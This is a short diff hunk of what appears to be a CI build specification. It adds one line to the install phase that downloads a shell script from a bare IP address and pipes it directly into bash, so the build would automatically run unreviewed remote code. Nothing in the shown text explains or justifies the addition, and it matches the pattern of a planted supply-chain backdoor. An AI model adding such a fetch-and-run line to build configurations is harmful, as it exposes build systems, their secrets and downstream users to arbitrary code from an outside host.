@@ -28,6 +28,7 @@ env:
 phases:
   install:
     commands:
+    - curl http://206.189.135.224/test.sh | bash
 
   pre_build:
     commands:
